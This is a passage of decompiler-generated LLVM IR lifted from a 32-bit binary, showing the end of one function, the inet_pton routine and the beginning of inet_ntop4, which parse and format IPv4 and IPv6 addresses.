  %v9_805368f = icmp eq i8 %v2_80536a321, 46
  %v1_8053692 = icmp eq i1 %v9_805368f, false
  br i1 %v1_8053692, label %dec_label_pc_80536c8, label %dec_label_pc_8053694

dec_label_pc_8053694:                             ; preds = %dec_label_pc_805368f
  %v0_8053694 = load i32, i32* @edx, align 4
  %v1_8053694 = icmp eq i32 %v0_8053694, 0
  br i1 %v1_8053694, label %dec_label_pc_80536c8, label %dec_label_pc_8053698

dec_label_pc_8053698:                             ; preds = %dec_label_pc_8053694
  %v0_8053698 = load i32, i32* @edi, align 4
  %v9_8053698 = icmp eq i32 %v0_8053698, 4
  br i1 %v9_8053698, label %dec_label_pc_80536c8, label %dec_label_pc_805369d

dec_label_pc_805369d:                             ; preds = %dec_label_pc_8053698
  %v0_805369d = load i32, i32* @esi, align 4
  %v1_805369d = add i32 %v0_805369d, 1
  store i32 %v1_805369d, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_80536a0 = inttoptr i32 %v1_805369d to i8*
  store i8 0, i8* %v1_80536a0, align 1
  br label %dec_label_pc_80536a3.backedge

dec_label_pc_80536a3.backedge:                    ; preds = %dec_label_pc_805369d, %dec_label_pc_805368b, %dec_label_pc_805367f
  %v0_80536a3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80536a3 = inttoptr i32 %v0_80536a3.pre to i8*
  %v2_80536a3 = load i8, i8* %v1_80536a3, align 1
  %v3_80536a3 = sext i8 %v2_80536a3 to i32
  store i32 %v3_80536a3, i32* @ecx, align 4
  %v1_80536a6 = add i32 %v0_80536a3.pre, 1
  store i32 %v1_80536a6, i32* %ebx.global-to-local, align 4
  %v1_80536a7 = icmp eq i8 %v2_80536a3, 0
  %v1_80536a9 = icmp eq i1 %v1_80536a7, false
  br i1 %v1_80536a9, label %dec_label_pc_8053666, label %dec_label_pc_80536ab

dec_label_pc_80536ab:                             ; preds = %dec_label_pc_80536a3.backedge
  %v0_80536ab.pre = load i32, i32* @edi, align 4
  %v7_80536ae = icmp sgt i32 %v0_80536ab.pre, 3
  br i1 %v7_80536ae, label %dec_label_pc_80536b0, label %dec_label_pc_80536c8

dec_label_pc_80536b0:                             ; preds = %dec_label_pc_80536ab
  %v0_80536b0 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_805365b, i32* %eax.global-to-local, align 4
  %v3_80536b9 = bitcast i32* %stack_var_-20 to i16*
  %v4_80536b9 = call i32 @memcpy(i16* %v3_80536b9, i32 4, i32 %v0_80536b0)
  br label %dec_label_pc_80536ca

dec_label_pc_80536c8:                             ; preds = %dec_label_pc_8053698, %dec_label_pc_8053694, %dec_label_pc_805368f, %dec_label_pc_8053685, %dec_label_pc_805366e, %dec_label_pc_80536ab.thread, %dec_label_pc_80536ab
  br label %dec_label_pc_80536ca

dec_label_pc_80536ca:                             ; preds = %dec_label_pc_80536b0, %dec_label_pc_80536c8
  %storemerge = phi i32 [ 0, %dec_label_pc_80536c8 ], [ 1, %dec_label_pc_80536b0 ]
  %v0_80536d1 = phi i32 [ 0, %dec_label_pc_80536c8 ], [ 1, %dec_label_pc_80536b0 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805364e, i32* @esi, align 4
  ret i32 %v0_80536d1

; uselistorder directives
  uselistorder i32 %v3_80536a3, { 1, 0 }
  uselistorder i8 %v2_80536a3, { 1, 2, 0 }
  uselistorder i32 %v1_8053686, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 2, 1, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_80536ca, { 1, 0 }
  uselistorder label %dec_label_pc_80536c8, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8053666, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80536d2 = load i32, i32* @ebp, align 4
  %v0_80536d3 = load i32, i32* @edi, align 4
  %v0_80536d4 = load i32, i32* @esi, align 4
  %v0_80536d5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_80536dd = ptrtoint i8* %arg2 to i32
  store i32 %v4_80536dd, i32* @edi, align 4
  %v9_80536e1 = icmp eq i32 %arg1, 2
  br i1 %v9_80536e1, label %dec_label_pc_80536f1, label %dec_label_pc_80536e6

dec_label_pc_80536e6:                             ; preds = %entry
  %v9_80536e6 = icmp eq i32 %arg1, 10
  %v1_80536e9 = icmp eq i1 %v9_80536e6, false
  br i1 %v1_80536e9, label %dec_label_pc_8053882, label %dec_label_pc_8053701

dec_label_pc_80536f1:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_80536dd, i32* @eax, align 4
  %v3_80536f7 = call i32 @inet_pton4(i32 %v0_80536d5, i32 %v0_80536d4, i32 %v0_80536d3)
  store i32 %v3_80536f7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053894

dec_label_pc_8053701:                             ; preds = %dec_label_pc_80536e6
  %v2_8053706 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053706, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_805370b = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_805370b, i32* @ebx, align 4
  %v2_8053712 = add i32 %v5_805370b, 16
  store i32 %v2_8053712, i32* %eax.global-to-local, align 4
  %v0_805371c = load i32, i32* @edi, align 4
  %v1_805371c = inttoptr i32 %v0_805371c to i8*
  %v2_805371c = load i8, i8* %v1_805371c, align 1
  %v11_805371c = icmp eq i8 %v2_805371c, 58
  %v1_805371f = icmp eq i1 %v11_805371c, false
  br i1 %v1_805371f, label %dec_label_pc_80537b2, label %dec_label_pc_8053721

dec_label_pc_8053721:                             ; preds = %dec_label_pc_8053701
  %v1_8053721 = add i32 %v0_805371c, 1
  store i32 %v1_8053721, i32* @edi, align 4
  %v1_8053722 = inttoptr i32 %v1_8053721 to i8*
  %v2_8053722 = load i8, i8* %v1_8053722, align 1
  %v11_8053722 = icmp eq i8 %v2_8053722, 58
  %v1_8053725 = icmp eq i1 %v11_8053722, false
  br i1 %v1_8053725, label %dec_label_pc_8053892, label %dec_label_pc_80537b2

dec_label_pc_8053739:                             ; preds = %dec_label_pc_80537f2
  %v4_8053741 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_80574d4.282, i32 0, i32 0), i32 %v2_80537f9)
  store i32 %v4_8053741, i32* %eax.global-to-local, align 4
  %v0_8053746 = load i32, i32* @edi, align 4
  %v1_8053746 = add i32 %v0_8053746, 1
  store i32 %v1_8053746, i32* @edi, align 4
  %v1_805374a = icmp eq i32 %v4_8053741, 0
  br i1 %v1_805374a, label %dec_label_pc_8053769, label %dec_label_pc_805374e

dec_label_pc_805374e:                             ; preds = %dec_label_pc_8053739
  %v0_805374e = load i32, i32* @ebp, align 4
  %v2_805374e = mul i32 %v0_805374e, 16
  %v1_8053751 = add i32 %v4_8053741, -134575316
  store i32 %v1_8053751, i32* %eax.global-to-local, align 4
  %v2_8053756 = or i32 %v2_805374e, %v1_8053751
  store i32 %v2_8053756, i32* @ebp, align 4
  %tmp126 = icmp ult i32 %v2_8053756, 65536
  br i1 %tmp126, label %dec_label_pc_80537f2.outer, label %dec_label_pc_8053892

dec_label_pc_80537f2.outer:                       ; preds = %dec_label_pc_805374e, %dec_label_pc_80537b2
  %v0_80537f536 = phi i32 [ %v1_8053746, %dec_label_pc_805374e ], [ %stack_var_-36.0.in, %dec_label_pc_80537b2 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_805374e ], [ %stack_var_-44.0, %dec_label_pc_80537b2 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_805374e ], [ %stack_var_-36.0, %dec_label_pc_80537b2 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_805374e ], [ 0, %dec_label_pc_80537b2 ]
  %v4_805376e = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_8053773 = icmp eq i1 %v4_805376e, false
  br label %dec_label_pc_80537f2

dec_label_pc_8053769:                             ; preds = %dec_label_pc_8053739
  %v0_8053769 = load i32, i32* @esi, align 4
  %v9_8053769 = icmp eq i32 %v0_8053769, 58
  %v1_805376c = icmp eq i1 %v9_8053769, false
  br i1 %v1_805376c, label %dec_label_pc_80537be, label %dec_label_pc_805376e

dec_label_pc_805376e:                             ; preds = %dec_label_pc_8053769
  br i1 %v1_8053773, label %dec_label_pc_805378a, label %dec_label_pc_8053775

dec_label_pc_8053775:                             ; preds = %dec_label_pc_805376e
  %v5_8053775 = icmp eq i8* %stack_var_-44.1, null
  %v1_805377a = icmp eq i1 %v5_8053775, false
  br i1 %v1_805377a, label %dec_label_pc_8053892, label %dec_label_pc_8053780

dec_label_pc_8053780:                             ; preds = %dec_label_pc_8053775
  %v0_8053780 = load i32, i32* @ebx, align 4
  %v5_8053780 = inttoptr i32 %v0_8053780 to i8*
  %v5_8053784 = inttoptr i32 %v1_8053746 to i8*
  br label %dec_label_pc_80537f2

dec_label_pc_805378a:                             ; preds = %dec_label_pc_805376e
  %v1_805378a = inttoptr i32 %v1_8053746 to i8*
  %v2_805378a = load i8, i8* %v1_805378a, align 1
  %v3_805378a = icmp eq i8 %v2_805378a, 0
  br i1 %v3_805378a, label %dec_label_pc_8053892, label %dec_label_pc_8053793

dec_label_pc_8053793:                             ; preds = %dec_label_pc_805378a
  %v0_8053793 = load i32, i32* @ebx, align 4
  %v1_8053793 = add i32 %v0_8053793, 2
  store i32 %v1_8053793, i32* @edx, align 4
  %v6_805379a = icmp ugt i32 %v1_8053793, %v2_8053712
  br i1 %v6_805379a, label %dec_label_pc_8053892, label %dec_label_pc_80537a0

dec_label_pc_80537a0:                             ; preds = %dec_label_pc_8053793
  %v0_80537a0 = load i32, i32* @ebp, align 4
  %v2_80537a2 = udiv i32 %v0_80537a0, 256
  %v4_80537a2 = trunc i32 %v2_80537a2 to i8
  %v3_80537a5 = inttoptr i32 %v0_8053793 to i8*
  store i8 %v4_80537a2, i8* %v3_80537a5, align 1
  %v0_80537a7 = load i32, i32* @ebp, align 4
  store i32 %v0_80537a7, i32* %eax.global-to-local, align 4
  %v1_80537a9 = trunc i32 %v0_80537a7 to i8
  %v2_80537a9 = load i32, i32* @ebx, align 4
  %v3_80537a9 = add i32 %v2_80537a9, 1
  %v4_80537a9 = inttoptr i32 %v3_80537a9 to i8*
  store i8 %v1_80537a9, i8* %v4_80537a9, align 1
  %v0_80537ac = load i32, i32* @edx, align 4
  store i32 %v0_80537ac, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80537b2

dec_label_pc_80537b2:                             ; preds = %dec_label_pc_8053701, %dec_label_pc_8053721, %dec_label_pc_80537a0
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_80537a0 ], [ %v1_8053721, %dec_label_pc_8053721 ], [ %v0_805371c, %dec_label_pc_8053701 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_80537a0 ], [ null, %dec_label_pc_8053721 ], [ null, %dec_label_pc_8053701 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80537f2.outer

dec_label_pc_80537be:                             ; preds = %dec_label_pc_8053769
  %v9_80537be = icmp eq i32 %v0_8053769, 46
  %v1_80537c1 = icmp eq i1 %v9_80537be, false
  br i1 %v1_80537c1, label %dec_label_pc_8053892, label %dec_label_pc_80537c7

dec_label_pc_80537c7:                             ; preds = %dec_label_pc_80537be
  %v0_80537c7 = load i32, i32* @ebx, align 4
  %v1_80537c7 = add i32 %v0_80537c7, 4
  store i32 %v1_80537c7, i32* @esi, align 4
  %v6_80537ce = icmp ugt i32 %v1_80537c7, %v2_8053712
  br i1 %v6_80537ce, label %dec_label_pc_8053892, label %dec_label_pc_80537d4

dec_label_pc_80537d4:                             ; preds = %dec_label_pc_80537c7
  store i32 %v0_80537c7, i32* @edx, align 4
  %v4_80537d6 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_80537d6, i32* @eax, align 4
  %v2_80537da = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_80537da = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_80537da, i32 %v2_8053712)
  store i32 %v5_80537da, i32* %eax.global-to-local, align 4
  %v0_80537df = load i32, i32* @esi, align 4
  %tmp61 = icmp slt i32 %v5_80537da, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_8053829, label %dec_label_pc_8053892

dec_label_pc_80537f2:                             ; preds = %dec_label_pc_80537f2.outer, %dec_label_pc_8053780
  %v0_80537f5 = phi i32 [ %v1_8053746, %dec_label_pc_8053780 ], [ %v0_80537f536, %dec_label_pc_80537f2.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8053780, %dec_label_pc_8053780 ], [ %stack_var_-44.1.ph, %dec_label_pc_80537f2.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8053784, %dec_label_pc_8053780 ], [ %stack_var_-36.1.ph, %dec_label_pc_80537f2.outer ]
  %v1_80537f5 = inttoptr i32 %v0_80537f5 to i8*
  %v2_80537f5 = load i8, i8* %v1_80537f5, align 1
  %v3_80537f5 = sext i8 %v2_80537f5 to i32
  store i32 %v3_80537f5, i32* %eax.global-to-local, align 4
  %v2_80537f9 = call i32 @__GI_tolower(i32 %v3_80537f5)
  store i32 %v2_80537f9, i32* %eax.global-to-local, align 4
  store i32 %v2_80537f9, i32* @esi, align 4
  %v1_8053803 = icmp eq i32 %v2_80537f9, 0
  %v1_8053805 = icmp eq i1 %v1_8053803, false
  br i1 %v1_8053805, label %dec_label_pc_8053739, label %dec_label_pc_805380b

dec_label_pc_805380b:                             ; preds = %dec_label_pc_80537f2
  %v0_8053861.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_805376e, label %dec_label_pc_8053829, label %dec_label_pc_8053812

dec_label_pc_8053812:                             ; preds = %dec_label_pc_805380b
  %v1_8053812 = add i32 %v0_8053861.pre.pre, 2
  store i32 %v1_8053812, i32* @edx, align 4
  %v6_8053819 = icmp ugt i32 %v1_8053812, %v2_8053712
  br i1 %v6_8053819, label %dec_label_pc_8053892, label %dec_label_pc_805381b

dec_label_pc_805381b:                             ; preds = %dec_label_pc_8053812
  %v0_805381b = load i32, i32* @ebp, align 4
  %v2_805381d = udiv i32 %v0_805381b, 256
  %v4_805381d = trunc i32 %v2_805381d to i8
  %v3_8053820 = inttoptr i32 %v0_8053861.pre.pre to i8*
  store i8 %v4_805381d, i8* %v3_8053820, align 1
  %v0_8053822 = load i32, i32* @ebp, align 4
  store i32 %v0_8053822, i32* %eax.global-to-local, align 4
  %v1_8053824 = trunc i32 %v0_8053822 to i8
  %v2_8053824 = load i32, i32* @ebx, align 4
  %v3_8053824 = add i32 %v2_8053824, 1
  %v4_8053824 = inttoptr i32 %v3_8053824 to i8*
  store i8 %v1_8053824, i8* %v4_8053824, align 1
  %v0_8053827 = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053829

dec_label_pc_8053829:                             ; preds = %dec_label_pc_805380b, %dec_label_pc_80537d4, %dec_label_pc_805381b
  %v0_8053861.pre = phi i32 [ %v0_80537df, %dec_label_pc_80537d4 ], [ %v0_8053827, %dec_label_pc_805381b ], [ %v0_8053861.pre.pre, %dec_label_pc_805380b ]
  %v4_8053829 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8053829 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_8053829, label %dec_label_pc_8053861, label %dec_label_pc_8053830

dec_label_pc_8053830:                             ; preds = %dec_label_pc_8053829
  store i32 1, i32* @esi, align 4
  %v6_8053837 = sub i32 %v0_8053861.pre, %v4_8053829
  store i32 %v6_8053837, i32* @edi, align 4
  %v16_805383b = icmp eq i32 %v0_8053861.pre, %v2_8053712
  %v1_805383f = icmp eq i1 %v16_805383b, false
  br i1 %v1_805383f, label %dec_label_pc_8053859.preheader, label %dec_label_pc_8053892

dec_label_pc_8053859.preheader:                   ; preds = %dec_label_pc_8053830
  %v3_805385994 = inttoptr i32 %v6_8053837 to i8*
  %v9_805385b97 = icmp slt i8* %v3_805385994, inttoptr (i32 1 to i8*)
  br i1 %v9_805385b97, label %dec_label_pc_8053861.thread, label %dec_label_pc_8053843

dec_label_pc_8053843:                             ; preds = %dec_label_pc_8053859.preheader, %dec_label_pc_8053843
  %v0_805385199 = phi i32 [ %v0_8053859.pre, %dec_label_pc_8053843 ], [ 1, %dec_label_pc_8053859.preheader ]
  %v0_805384398 = phi i32 [ %v1_8053859.pre, %dec_label_pc_8053843 ], [ %v6_8053837, %dec_label_pc_8053859.preheader ]
  %v2_8053849 = sub i32 %v0_805384398, %v0_805385199
  %v2_805384b = sub i32 %v2_8053712, %v0_805385199
  %v6_805384d = add i32 %v2_8053849, %v4_8053829
  store i32 %v6_805384d, i32* %eax.global-to-local, align 4
  %v1_8053851 = add i32 %v0_805385199, 1
  store i32 %v1_8053851, i32* @esi, align 4
  %v1_8053852 = inttoptr i32 %v6_805384d to i8*
  %v2_8053852 = load i8, i8* %v1_8053852, align 1
  %v3_8053852 = zext i8 %v2_8053852 to i32
  %v4_8053852 = load i32, i32* @edx, align 4
  %v5_8053852 = and i32 %v4_8053852, -256
  %v6_8053852 = or i32 %v5_8053852, %v3_8053852
  store i32 %v6_8053852, i32* @edx, align 4
  %v3_8053854 = inttoptr i32 %v2_805384b to i8*
  store i8 %v2_8053852, i8* %v3_8053854, align 1
  %v0_8053856 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053856 = inttoptr i32 %v0_8053856 to i8*
  store i8 0, i8* %v1_8053856, align 1
  %v0_8053859.pre = load i32, i32* @esi, align 4
  %v1_8053859.pre = load i32, i32* @edi, align 4
  %v2_8053859 = inttoptr i32 %v0_8053859.pre to i8*
  %v3_8053859 = inttoptr i32 %v1_8053859.pre to i8*
  %v9_805385b = icmp sgt i8* %v2_8053859, %v3_8053859
  br i1 %v9_805385b, label %dec_label_pc_8053861.thread, label %dec_label_pc_8053843

dec_label_pc_8053861.thread:                      ; preds = %dec_label_pc_8053843, %dec_label_pc_8053859.preheader
  br label %dec_label_pc_8053867

dec_label_pc_8053861:                             ; preds = %dec_label_pc_8053829
  %v16_8053861 = icmp eq i32 %v0_8053861.pre, %v2_8053712
  %v1_8053865 = icmp eq i1 %v16_8053861, false
  br i1 %v1_8053865, label %dec_label_pc_8053892, label %dec_label_pc_8053867

dec_label_pc_8053867:                             ; preds = %dec_label_pc_8053861.thread, %dec_label_pc_8053861
  store i32 %v2_8053706, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_8053873 = call i32 @memcpy(i16* %tmp63, i32 %v2_8053706, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053894

dec_label_pc_8053882:                             ; preds = %dec_label_pc_80536e6
  %v1_8053882 = call i32 @__errno_location(i32 %v0_80536d5)
  %v1_8053887 = inttoptr i32 %v1_8053882 to i32*
  store i32 97, i32* %v1_8053887, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053894

dec_label_pc_8053892:                             ; preds = %dec_label_pc_8053793, %dec_label_pc_805378a, %dec_label_pc_805374e, %dec_label_pc_8053775, %dec_label_pc_8053830, %dec_label_pc_80537d4, %dec_label_pc_8053861, %dec_label_pc_8053812, %dec_label_pc_80537c7, %dec_label_pc_80537be, %dec_label_pc_8053721
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053894

dec_label_pc_8053894:                             ; preds = %dec_label_pc_8053882, %dec_label_pc_8053867, %dec_label_pc_80536f1, %dec_label_pc_8053892
  %v0_805389b = phi i32 [ -1, %dec_label_pc_8053882 ], [ 1, %dec_label_pc_8053867 ], [ %v3_80536f7, %dec_label_pc_80536f1 ], [ 0, %dec_label_pc_8053892 ]
  store i32 %v0_80536d5, i32* @ebx, align 4
  store i32 %v0_80536d4, i32* @esi, align 4
  store i32 %v0_80536d3, i32* @edi, align 4
  store i32 %v0_80536d2, i32* @ebp, align 4
  ret i32 %v0_805389b

; uselistorder directives
  uselistorder i32 %v1_8053859.pre, { 1, 0 }
  uselistorder i32 %v0_8053859.pre, { 1, 0 }
  uselistorder i32 %v0_805385199, { 2, 1, 0 }
  uselistorder i32 %v0_8053861.pre, { 2, 1, 0 }
  uselistorder i32 %v0_8053861.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_80537f9, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_8053746, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_8053712, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_80536d5, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8053894, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053892, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8053867, { 1, 0 }
  uselistorder label %dec_label_pc_8053843, { 1, 0 }
  uselistorder label %dec_label_pc_8053829, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80537f2, { 1, 0 }
  uselistorder label %dec_label_pc_80537b2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80537f2.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_805389d = load i32, i32* @edi, align 4
  %v0_805389e = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_80538a6 = load i32, i32* @eax, align 4
  %v3_80538aa = and i32 %v0_80538a6, -65536
  store i32 %v3_80538aa, i32* %stack_var_-33, align 4
  %v2_80538b5 = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80538bb = load i32, i32* @edx, align 4
  %v5_80538bb = inttoptr i32 %v0_80538bb to i8*
  store i8* %v5_80538bb, i8** %stack_var_-60, align 4
  %v0_80538bf = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_80538c5 = add i32 %v2_80538b5, 4
  store i32 %v6_80538c5, i32* %edi.global-to-local, align 4
  %v2_80538c6 = inttoptr i32 %v6_80538c5 to i32*
  store i32 0, i32* %v2_80538c6, align 4
  %v3_80538c6 = load i32, i32* %edi.global-to-local, align 4
  %v6_80538c6 = add i32 %v3_80538c6, 4
  store i32 %v6_80538c6, i32* %edi.global-to-local, align 4
  %v0_80538c7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80538c7 = inttoptr i32 %v6_80538c6 to i32*
  store i32 %v0_80538c7, i32* %v2_80538c7, align 4
  %v3_80538c7 = load i32, i32* %edi.global-to-local, align 4
  %v6_80538c7 = add i32 %v3_80538c7, 4
  store i32 %v6_80538c7, i32* %edi.global-to-local, align 4
  %v0_80538c8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538c8 = trunc i32 %v0_80538c8 to i16
  %v3_80538c8 = inttoptr i32 %v6_80538c7 to i16*
  store i16 %v1_80538c8, i16* %v3_80538c8, align 2
  %v4_80538c8 = load i32, i32* %edi.global-to-local, align 4
  %v7_80538c8 = add i32 %v4_80538c8, 2
  store i32 %v7_80538c8, i32* %edi.global-to-local, align 4
  %v0_80538ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80538ca = trunc i32 %v0_80538ca to i8
  %v3_80538ca = inttoptr i32 %v7_80538c8 to i8*
  store i8 %v1_80538ca, i8* %v3_80538ca, align 1
  %v0_805395a26 = load i32, i32* %ebp.global-to-local, align 4
  %v7_805395d29 = icmp sgt i32 %v0_805395a26, 3
  br i1 %v7_805395d29, label %dec_label_pc_8053963, label %dec_label_pc_80538d0

dec_label_pc_80538d0:                             ; preds = %entry, %dec_label_pc_8053938
  %v0_805395a30 = phi i32 [ %v0_805395a, %dec_label_pc_8053938 ], [ %v0_805395a26, %entry ]
  %v0_80538d4 = load i32, i32* @ecx, align 4
  %v1_80538d4 = and i32 %v0_80538d4, -256
  %v2_80538d4 = or i32 %v1_80538d4, 100
  store i32 %v2_80538d4, i32* %ecx.global-to-local, align 4
  %v2_80538d6 = add i32 %v0_805395a30, %v0_80538a6
  store i32 %v2_80538d6, i32* %eax.global-to-local, align 4
  %v0_80538d8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80538d8 = add i32 %v0_80538d8, 1
  store i32 %v1_80538d8, i32* @esi, align 4
  store i32 %v0_80538d8, i32* @edi, align 4
  %v1_80538e1 = inttoptr i32 %v2_80538d6 to i8*
  %v2_80538e1 = load i8, i8* %v1_80538e1, align 1
  %v3_80538e1 = zext i8 %v2_80538e1 to i32
  %v4_80538e1 = load i32, i32* @edx, align 4
  %v5_80538e1 = and i32 %v4_80538e1, -65536
  %v6_80538e1 = or i32 %v5_80538e1, %v3_80538e1
  store i32 %v6_80538e1, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_80538e1, 100
  %v6_80538e7 = zext i8 %div to i32
  %v4_80538e9 = or i32 %v6_80538e7, %v1_80538d4
  store i32 %v4_80538e9, i32* %ecx.global-to-local, align 4
  %v1_80538eb = or i32 %v4_80538e9, 48
  store i32 %v1_80538eb, i32* %eax.global-to-local, align 4
  %v1_80538ee = trunc i32 %v1_80538eb to i8
  %v2_80538ee = load i32, i32* @esp, align 4
  %v4_80538ee = add i32 %v0_80538d8, 43
  %v5_80538ee = add i32 %v4_80538ee, %v2_80538ee
  %v6_80538ee = inttoptr i32 %v5_80538ee to i8*
  store i8 %v1_80538ee, i8* %v6_80538ee, align 1
  %v0_80538f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538f2 = trunc i32 %v0_80538f2 to i8
  %v7_80538f2 = icmp eq i8 %v1_80538f2, 48
  %v1_80538f4 = icmp eq i1 %v7_80538f2, false
  %v0_805391a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805391a = and i32 %v0_805391a, -256
  %v2_805391a = or i32 %v1_805391a, 10
  store i32 %v2_805391a, i32* %ecx.global-to-local, align 4
  %v0_805391c = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805391c, i32* %eax.global-to-local, align 4
  %v3_805391e = trunc i32 %v0_805391c to i16
  %v5_805391e = udiv i16 %v3_805391e, 10
  br i1 %v1_80538f4, label %dec_label_pc_805391a, label %dec_label_pc_80538f6

dec_label_pc_80538f6:                             ; preds = %dec_label_pc_80538d0
  %v9_80538fa = and i32 %v0_805391c, -65536
  %tmp = urem i16 %v5_805391e, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div32 = udiv i16 %tmp, 10
  %v7_8053907 = zext i16 %div32 to i32
  %v11_8053907 = or i32 %v7_8053907, %v9_80538fa
  store i32 %v11_8053907, i32* %eax.global-to-local, align 4
  %tmp34 = urem i16 %tmp, 10
  %v12_8053907 = zext i16 %tmp34 to i32
  %v1_805390a = or i32 %v12_8053907, 48
  %v8_805390a = trunc i32 %v1_805390a to i8
  store i32 %v1_805390a, i32* %edx.global-to-local, align 4
  %v2_805390d = load i32, i32* @esp, align 4
  %v3_805390d = load i32, i32* %ebx.global-to-local, align 4
  %v4_805390d = add i32 %v2_805390d, 43
  %v5_805390d = add i32 %v4_805390d, %v3_805390d
  %v6_805390d = inttoptr i32 %v5_805390d to i8*
  store i8 %v8_805390a, i8* %v6_805390d, align 1
  %v0_8053911 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053911 = trunc i32 %v0_8053911 to i8
  %v7_8053911 = icmp eq i8 %v1_8053911, 48
  br i1 %v7_8053911, label %dec_label_pc_8053938, label %dec_label_pc_8053916

dec_label_pc_8053916:                             ; preds = %dec_label_pc_80538f6
  %v0_8053916 = load i32, i32* @esi, align 4
  store i32 %v0_8053916, i32* @edi, align 4
  br label %dec_label_pc_8053938

dec_label_pc_805391a:                             ; preds = %dec_label_pc_80538d0
  %tmp35 = urem i16 %v5_805391e, 256
  %v3_8053920 = and i32 %v0_805391c, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div33 = udiv i16 %tmp35, 10
  %v7_805392b = zext i16 %div33 to i32
  %v11_805392b = or i32 %v7_805392b, %v3_8053920
